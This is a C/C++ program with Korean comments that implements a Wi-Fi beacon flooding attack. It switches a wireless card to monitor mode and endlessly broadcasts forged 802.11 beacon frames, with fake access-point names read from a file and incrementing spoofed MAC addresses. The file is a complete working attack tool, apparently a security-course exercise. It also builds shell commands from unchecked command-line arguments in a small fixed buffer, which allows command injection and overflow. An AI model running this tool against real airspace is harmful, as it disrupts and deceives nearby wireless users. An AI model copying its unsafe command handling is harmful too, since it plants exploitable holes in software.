#include <stdio.h>
#include <stdint.h> // uint
#include <pcap.h>   // pcap
#include <unistd.h> // sleep
#include <string.h> // memcpy, memcmp, memset, strcat
#include <ctype.h>  // isupper
#include <stdlib.h> // exit

// #########################################################################
// [구조체 영역]

#pragma pack(push,1)
struct Radiotap {
    uint8_t header_revison = 0x00;
    uint8_t header_pad = 0x00;
    uint16_t header_length = 0x000b;
    uint32_t header_presentflag = 0x00028000;
    uint8_t idontknow[3] = {0,}; // wireshark check <not found>
}; // radiotap 11byte

struct Beacon_Packet {
    uint16_t type = 0x0080;
    uint16_t duration = 0x0000;
    uint8_t destination_address[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t source_address[6]= {0,};
    uint8_t bssid[6] = {0,};
    uint16_t sequence_number = 0x0000;
}; // beacon frame 24byte

struct Fixed_Parameter {
    uint64_t timestamp = 0x0000000000000000;
    uint16_t interval = 0x0000;
    uint16_t capabilities = 0x0000;
}; // fixed 12byte

struct Taged_SSID_Parameter {
    uint8_t number = 0x00;
    uint8_t length = 32;
    char ssid[32] = {0,};
}; // taged_ssid 34byte

struct Taged_DS_Parameter {
    uint8_t number = 0x03;
    uint8_t length = 0x01;
    uint8_t channel = 0x01;
}; // taged_ds 3byte

struct Taged_Support_Parameter {
    uint8_t number = 0x01;
    uint8_t length = 0x03;
    uint8_t rates[3] = {0x82,0x8b,0x96};
}; // taged_support 5byte

struct Beacon_Flood {
    struct Radiotap radiotap;
    struct Beacon_Packet beacon;
    struct Fixed_Parameter fixed;
    struct Taged_SSID_Parameter tag_ssid;
    struct Taged_DS_Parameter tag_ds;
    struct Taged_Support_Parameter tag_support;
}; // 89byte
#pragma pack(pop)

// #########################################################################
void usage() {
    printf("syntax: ./beacon-flood [interface] [ssid list file]\n");
    printf("\n");
    printf("[interface] : 공격에 사용할 랜카드 인터페이스 이름을 입력해주십시오.\n");
    printf("	'ifconfig -a' 명령어로 확인할 수 있습니다.\n");
    printf("\n");
    printf("[ssid list file] : ssid 목록이 담긴 파일의 경로를 입력해주십시오.\n");
    printf("	파일의 인코딩이 utf-8이 아닌 경우, 에러가 날 수 있습니다.\n");
    printf("	'file -bi <파일명>'으로 파일의 인코딩을 확인할 수 있으며,\n");
    printf("	'iconv' 명령어로 파일의 인코딩을 변경할 수 있습니다.\n");
    exit(0);

} // 사용 예시 출력 함수.
// #########################################################################

int main(int argc, char *argv[])
{
    if (3 != argc) usage();
    // 인자 값이 3개가 아니면 사용법 안내.

    char* dev = argv[1];
    char excute_command[70];
    memset(excute_command,0,70);
    sprintf(excute_command, "ifconfig %s down", dev);
    system(excute_command);
    sprintf(excute_command, "iwconfig %s mode monitor", dev);
    system(excute_command);
    sprintf(excute_command, "ifconfig %s up", dev);
    system(excute_command);
    // 자동으로 모니터 모드 전환.

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    // 인자 값으로 받은 네트워크 장치를 사용해 promiscuous 모드로 pcap를 연다.

    if (handle == nullptr) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        return -1;
    } // 열지 못하면 메세지 출력 후 비정상 종료.

    FILE *fp;
    sprintf(excute_command, "file -bi %s | grep utf-8", argv[2]);
    if ((fp = popen(excute_command,"r")) == 0){
        printf("※  파이프를 여는 도중 에러가 났습니다.\n");
        exit (0);
    }
    memset(excute_command,0,70);
    fgets(excute_command,26,fp);
    pclose(fp);
    if (strlen(excute_command) == 0){
        printf("※  파일이 존재하지 않거나, 파일의 인코딩이 UTF-8이 아닙니다.\n");
        printf("\n");
        usage();
    }
    // 파이프를 통해 파일의 인코딩 정보를 확인함. (file + grep)
    // (굳이 UTF-8 인코딩된 파일만 받는 이유는 한글 전송시, UTF-8을 사용하기 때문임.)

    uint8_t count=0, length;
    char temp[34]; // (SSID 32byte, CRLF 2byte)
    struct Beacon_Flood data;

    length = sizeof(data);
    fp = fopen(argv[2],"rb");
    // 바이너리 읽기 모드로 SSID LIST 파일을 엶.

    while (true) {
        while ((fgets(temp,sizeof(temp),fp)) != 0){
            if (temp[strlen(temp)-1] == 0x0d) temp[strlen(temp)-1] = 0x00;
            if (temp[strlen(temp)-1] == 0x0a) temp[strlen(temp)-1] = 0x00;
            memcpy(data.tag_ssid.ssid, temp, 32);
            // 파일에서 한줄을 읽어와, 문자열의 맨 뒤 공백(CTLF)을 제거해줌.

            if (count == 255){
                count = 0;
                data.beacon.source_address[4]++;
                if (data.beacon.source_address[4] == 255){
                    data.beacon.source_address[4]=0;
                    data.beacon.source_address[3]++;
                    if (data.beacon.source_address[3] == 255){
                        data.beacon.source_address[3]=0;
                        data.beacon.source_address[2]++;
                        if (data.beacon.source_address[2] == 255){
                            data.beacon.source_address[2]=0;
                            data.beacon.source_address[1]++;
                            if (data.beacon.source_address[1]==255){
                                data.beacon.source_address[1]=0;
                                data.beacon.source_address[0]++;
                            }
                        }
                    }
                }
            } else {
                count++;
            }
            data.beacon.source_address[5] = count;
            // 00:00:00:00:00:00 에서 SSID의 개수만큼 반복하며,
            // 첫 번째 자릿수 부터 여섯 번째 자릿수까지 올림.

            memcpy(data.beacon.bssid, data.beacon.source_address, 6);
            // BSSID를 SSID값으로 설정함.
            // (libtins 예제가 신형 폰에서는 안 됐었던 원인임.)

            printf("Beacon Flooding! [MAC: %02X:%02X:%02X:%02X:%02X:%02X] [SSID: %s]\n",
                   data.beacon.source_address[0], data.beacon.source_address[1],
                   data.beacon.source_address[2], data.beacon.source_address[3],
                   data.beacon.source_address[4], data.beacon.source_address[5],
                   data.tag_ssid.ssid);

            if (pcap_sendpacket(handle, (unsigned char*)&data, length) != 0){
                printf("※  Beacon Flooding Fail..\n");
                exit (-1);
            } // Beacon Flooding 패킷을 보냄

            memset(data.beacon.bssid,0,6);
            memset(data.tag_ssid.ssid,0,32);
            memset(temp,0,34);
            // 변수 초기화
            usleep(10);
            // 딜레이
        }
        fseek(fp,0,SEEK_SET);
        // 파일 포인터의 위치를 파일 시작 위치로 변경
        count = 0;
        memset(data.beacon.source_address,0,6);
        // 변수 초기화
        // (여기서 초기화하는 이유는 한 파일 읽는 동안, MAC을 구성하는데 써야 하기 때문임.)
    }
    fclose(fp);
    // 파일 핸들 닫음.
    pcap_close(handle);
    // 무한 반복 함수가 끝난 경우 pcap 핸들을 닫음.

}
